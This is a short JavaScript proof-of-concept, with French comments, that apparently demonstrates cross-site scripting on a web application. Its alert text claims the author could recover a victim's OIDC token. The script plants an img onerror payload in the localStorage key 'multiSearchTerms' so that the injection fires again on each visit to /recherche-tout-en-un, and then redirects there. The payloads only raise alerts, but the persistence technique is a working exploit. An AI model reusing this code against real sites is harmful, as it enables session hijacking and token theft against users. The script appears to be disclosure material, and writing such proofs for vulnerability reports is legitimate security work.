(function () {
    try {  alert(`Voila la preuve d'exec JS sur ${document.domain} . SI la victime a un compte et une session inactive je peux recuperer l'oidc ici. \n Si la victime n'a pas encore de compte un attaquant peut polluer le localstorage pour provoquer une exec a chaque fois qu'il ira sur /recherche-tout-en-un \n Dans ce POC je vais vous redirigez directement sur /recherche-tout-en-un pour constater l'exec JS a partir de la valeur injecter dans le localstorage ici `); } catch (e) {}

    // STAGE 2 (à constater) : on écrit un JSON VALIDE (guillemets OK ici, hors filtre)
    try { localStorage.setItem('multiSearchTerms', JSON.stringify([`<img src=x onerror="alert('preuve execution js dans le contexte: ${document.domain}')">`])); } catch (e) {}

    // laisser l'alerte stage-1, puis naviguer vers la recherche pour observer un éventuel 2e fire
    setTimeout(function () { location.assign('/recherche-tout-en-un'); }, 400);
})();